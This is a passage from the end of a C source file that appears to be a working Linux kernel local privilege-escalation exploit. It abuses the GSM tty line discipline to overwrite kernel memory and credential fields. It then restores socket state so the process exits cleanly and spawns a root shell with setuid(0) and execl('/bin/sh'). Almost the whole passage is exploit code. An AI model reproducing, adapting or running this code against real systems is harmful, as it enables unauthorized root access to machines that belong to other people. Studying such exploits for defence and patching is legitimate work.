        setsockopt(corrupted, SOL_SOCKET, SO_KEEPALIVE, &a, b);
    }
    free(ovw_buf);
    

    #ifdef DEBUG
    // creds after overwrite
    for(u8 cur_field = 0; cur_field < FIELDS; cur_field++) {
        u32 cred_leak = READ(cred + fields[cur_field].off);
        LOG("[+] current_cred()->%s: %d\n", fields[cur_field].fname, cred_leak);
    }
    #endif

    LOG("[+] Cleaning up ...\n");
    // set sock.net back to what it was, and put sk.refcnt back to 1. this should be enough for a
    // clean exit
    gsm_reset(master_fd, slave_fd);
    struct cleanup {
        u8 pad[KMALLOC_2K - clash_len + SKC_NET_OFFSET];
        u8 *net_ptr;
    } cleanup = {0};
    cleanup.net_ptr = (void*)orig_net_ptr;
    GSM_WRITE(master_fd, &cleanup, sizeof(cleanup));
    GSM_WRITE(master_fd, &zero_overwrite_buf, offsets->SKC_REFCNT - (SKC_NET_OFFSET+8));
    u32 refs = 1;
    GSM_WRITE(master_fd, &refs, sizeof(u32));

    LOG("[+] Spawning root shell\n");
    SYS(setuid(0)); SYS(setgid(0)); SYS(seteuid(0)); SYS(seteuid(0));
    execl("/bin/sh","");

    return 0;
}
